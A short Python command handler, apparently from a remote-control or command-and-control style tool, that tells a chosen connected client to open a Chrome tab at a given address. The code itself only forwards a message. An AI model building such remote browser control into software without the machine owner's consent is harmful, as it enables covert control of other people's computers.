# commands/chrome.py
from colorama import Fore, Style

requires_id = True



def execute(conn, args, clients, id):
    msg = 'Chrome ' + args[1]
    clients[id].sendall(bytes(msg, 'utf-8'))
    print("Opening Chrome tab on client:", id)
